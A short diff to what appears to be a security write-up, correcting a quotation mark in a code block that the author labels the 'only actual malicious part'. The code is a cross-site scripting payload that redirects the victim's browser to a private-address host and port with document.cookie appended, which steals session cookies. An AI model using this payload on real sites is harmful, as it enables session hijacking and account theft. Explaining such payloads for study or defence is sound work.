@@ -72,7 +72,7 @@ Most of the code here is just standard boilerplate stuff. I threw in the rectang
 
 The only actual malicious part of this is:
 ```bash
-<script type="text/javascript>
+<script type="text/javascript">
 window.location='http://192.168.34.222:8080/?cookie-' + document.cookie;
 </script>
 ```
